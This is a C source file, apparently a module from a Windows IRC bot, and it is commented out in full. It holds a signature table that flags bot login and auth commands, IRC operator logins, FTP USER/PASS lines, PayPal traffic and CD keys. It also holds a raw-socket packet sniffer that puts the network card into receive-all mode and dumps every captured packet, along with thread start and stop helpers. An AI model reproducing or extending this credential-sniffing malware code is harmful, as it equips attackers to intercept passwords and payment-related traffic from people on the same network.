#include "../Includes/includes.h"

/*signs sig[] =
{
    {":.login", BOTP},
    {":,login", BOTP},
    {":!login", BOTP},
    {":@login", BOTP},
    {":$login", BOTP},
    {":%login", BOTP},
    {":^login", BOTP},
    {":&login", BOTP},
    {":*login", BOTP},
    {":-login", BOTP},
    {":+login", BOTP},
    {":/login", BOTP},
    {":=login", BOTP},
    {":?login", BOTP},
    {":'login", BOTP},
    {":`login", BOTP},
    {":~login", BOTP},
    {": login", BOTP},
    {":.auth", BOTP},
    {":@auth", BOTP},
    {":$auth", BOTP},
    {":^auth", BOTP},
    {":.+auth", BOTP},
    {":'auth", BOTP},
    {":`auth", BOTP},
    {":~auth", BOTP},
    {":.id", BOTP},
    {": id", BOTP},
    {":.hashin", BOTP},
    {":.l", BOTP},
    {":!l", BOTP},
    {":$l", BOTP},
    {":.x", BOTP},
    {" CDKey ", BOTP},
    {"JOIN #", IRCP},
    {"OPER ", IRCP},
    {"oper ", IRCP},
    {"now an IRC Operator", IRCP},
    {"USER ", FTPP},
    {"PASS ", FTPP},
    {"FTP sniff", FTPP},
    {"paypal", HTTPP},
    {"PAYPAL", HTTPP},
    {"paypal.com", HTTPP},
    {"PAYPAL.COM", HTTPP},
//	{"Set-Cookie:", HTTPP},
    {"Serv-U FTP Server", SSHP},
    {"OpenSSL/0.9.6", SSHP},
    {"OpenSSH_2", SSHP},
    {NULL, 0}
};*/

/*DWORD WINAPI PacketSniffer(LPVOID)
{
    bPacketSniffing = TRUE;
printf("SNIFFING STARTED1\n");
    char szInterface[2048], *szPacket, szRawData[65535];
    DWORD dwRet;
    int i, val = 1;
    IN_ADDR ia;
    //IPHEADER *iphdr;
    //TCPHEADER *tcphdr;

    SOCKET sPacketSnifferSock = WSASocket(AF_INET, SOCK_RAW, IPPROTO_IP, NULL, NULL, WSA_FLAG_OVERLAPPED);
    if(sPacketSnifferSock == INVALID_SOCKET)
    {printf("SNIFFING STOPPED1 (%ld)\n", GetLastError());
        closesocket(sPacketSnifferSock);
        return 0;
    }

    if(WSAIoctl(sPacketSnifferSock, SIO_ADDRESS_LIST_QUERY, NULL, NULL, szInterface, sizeof(szInterface), &dwRet, NULL, NULL) == SOCKET_ERROR)
    {printf("SNIFFING STOPPED2\n");
        closesocket(sPacketSnifferSock);
        return 0;
    }

    SOCKET_ADDRESS_LIST *salist;
    salist = (SOCKET_ADDRESS_LIST *)szInterface;

    struct sockaddr_in sin;
    sin.sin_family = AF_INET;
    sin.sin_port = 0;

//Address[0] Is First Dedicated Network Card, Beware If You Use WMware As It Adds Two Network Cards!!
    sin.sin_addr.s_addr = ((struct sockaddr_in *)salist->Address[0].lpSockaddr)->sin_addr.s_addr;

    if(bind(sPacketSnifferSock, (struct sockaddr *)&sin, sizeof(sin)) == SOCKET_ERROR)
    {printf("SNIFFING STOPPED3\n");
        closesocket(sPacketSnifferSock);
        return 0;
    }

    if(WSAIoctl(sPacketSnifferSock, SIO_RCVALL, &val, sizeof(val), NULL, 0, &dwRet, NULL, NULL) == SOCKET_ERROR)
    {printf("SNIFFING STOPPED4\n");
        closesocket(sPacketSnifferSock);
        return 0;
    }

    printf("SNIFFING STARTED2\n");
    while(bPacketSniffing)
    {
        memset(szRawData, 0, sizeof(szRawData));
        szPacket = (char *)szRawData;
        if(recv(sPacketSnifferSock, szPacket, sizeof(szRawData), 0) == SOCKET_ERROR)
        {
            //Output something about the error - STORE THE OUTPUT FUNCTION IN THE PROTOCOL THOUGH
            break;
        }

        //iphdr = (IPHEADER *)szPacket;
        //if(iphdr->proto == 6)
        //{
            //szPacket += sizeof(*iphdr);
            //tcphdr = (TCPHEADER *)szPacket;
            //ia.S_un.S_addr = iphdr->sourceIP;
            //if(tcphdr->th_flag == 24)
            //{
                //szPacket += sizeof(*tcphdr);

                //char *pcPacketSegment = strtok(szPacket, "\n");
                //printf("PACKET: %s:%d - \'%s\'", inet_ntoa(ia), ntohs(tcphdr->th_sport), pcPacketSegment);
                printf("PACKET: \'%s\'\n", szPacket);
                //break;
            //}
        //}
        Sleep(250);
    }

    closesocket(sPacketSnifferSock);
}

void StartPacketSniffer()
{
    while(TRUE)
    {
        HANDLE hThread = CreateThread(NULL, NULL, PacketSniffer, NULL, NULL, NULL);

        if(hThread)
        {
            CloseHandle(hThread);
            break;
        }

        Sleep(500);
    }
}

void StopPacketSniffer()
{
    bPacketSniffing = FALSE;
}*/
